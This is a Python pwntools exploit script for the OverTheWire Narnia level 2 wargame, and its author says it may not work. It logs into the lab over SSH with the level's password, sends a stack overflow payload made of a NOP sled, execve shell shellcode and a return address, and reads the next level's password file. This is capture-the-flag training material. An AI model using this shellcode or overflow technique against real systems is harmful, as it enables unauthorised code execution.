from pwn import *
#can't get script to work but you get the idea
context(arch='i386', os='linux')
s = ssh(user='narnia2', host='narnia.labs.overthewire.org', password='nairiepecu', port=2226)
# Our execution address
address=0xffffd620 - 64
# The amount of space we need to cover
offset=120
# The shellcode itself
shellcode='\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
# How many nops we need to padd
nop_count=offset-len(shellcode)
# The actual nops themselves
nops='\x90'*(nop_count)
# build the payload
payload=nops+shellcode+p32(address)*8
#print(payload)
run_payload="$(python -c 'print "+payload+" ')"
#sh=s.run('/narnia/narnia2 '+run_payload)
#print('/narnia/narnia2 '+run_payload)
sh=s.run('/narnia/narnia2 '+run_payload)
sh.recvline()
sh.sendline("cat /etc/narnia_pass/narnia3")
ans=sh.recvline()
for i in range(2):
    ans+=sh.recvline()
log.info('Flag: '+ans)
s.close()

